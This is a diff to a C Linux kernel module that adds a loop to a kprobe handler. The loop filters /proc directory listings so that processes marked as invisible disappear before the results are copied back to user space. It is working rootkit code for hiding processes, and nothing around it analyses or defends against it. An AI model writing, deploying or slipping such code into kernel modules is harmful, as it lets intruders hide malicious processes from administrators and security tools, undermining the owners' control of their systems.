@@ -70,6 +70,35 @@ static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 	    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
 		/*&& MINOR(d_inode->i_rdev) == 1*/)
 		    proc = 1;
+
+		while (offset < ret)
+	    {
+		    dir = (void *)kdirent + offset;
+
+		    if ((proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
+		    {
+			    if (dir == kdirent)
+			    {
+				    ret -= dir->d_reclen;
+				    memmove(dir, (void *)dir + dir->d_reclen, ret);
+				    continue;
+			    }
+			    prev->d_reclen += dir->d_reclen;
+		    }
+		    else
+		    {
+			    prev = dir;
+		    }
+		    offset += dir->d_reclen;
+	    }
+	
+	    // Copying directory name (or pid name) from kernel space to user space, after changing
+	    err = copy_to_user(dirent, kdirent, ret);
+	
+	    if (err)
+	    {
+	        goto out;
+	    }
 		
 	out:
 	    kfree(kdirent);
